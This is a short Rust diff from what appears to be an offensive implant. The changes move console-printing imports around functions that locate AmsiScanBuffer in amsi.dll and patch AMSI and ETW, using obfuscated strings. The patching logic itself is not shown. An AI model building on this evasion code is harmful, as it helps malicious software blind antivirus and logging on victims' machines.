@@ -7,8 +7,7 @@ use windows_sys::Win32::System::{
     Diagnostics::Debug::WriteProcessMemory, Threading::GetCurrentProcess,
 };
 
-use shared::pretty_print::print_failed;
-use shared::pretty_print::print_info;
+use crate::utils::console::{print_failed, print_info};
 
 pub fn run_evasion() {
     //
@@ -31,11 +30,16 @@ pub fn patch_amsi_if_ft_flag() {
     {
         use shared_no_std::export_resolver::resolve_address;
 
+        use crate::utils::console::print_info;
+
         print_info(sc!("Patching amsi..", 49).unwrap());
 
         let fn_addr = match resolve_address(&sc!("amsi.dll", 42).unwrap(), "AmsiScanBuffer", None) {
             Ok(a) => a,
             Err(_) => {
+                #[cfg(debug_assertions)]
+                use crate::utils::console::print_failed;
+
                 #[cfg(debug_assertions)]
                 print_failed("Failed to find function AmsiScanBuffer..");
 
@@ -68,6 +72,9 @@ pub fn patch_amsi_if_ft_flag() {
 fn etw() {
     #[cfg(feature = "patch_etw")]
     {
+        #[cfg(debug_assertions)]
+        use crate::utils::console::print_info;
+
         #[cfg(debug_assertions)]
         print_info("Patching etw..");
 
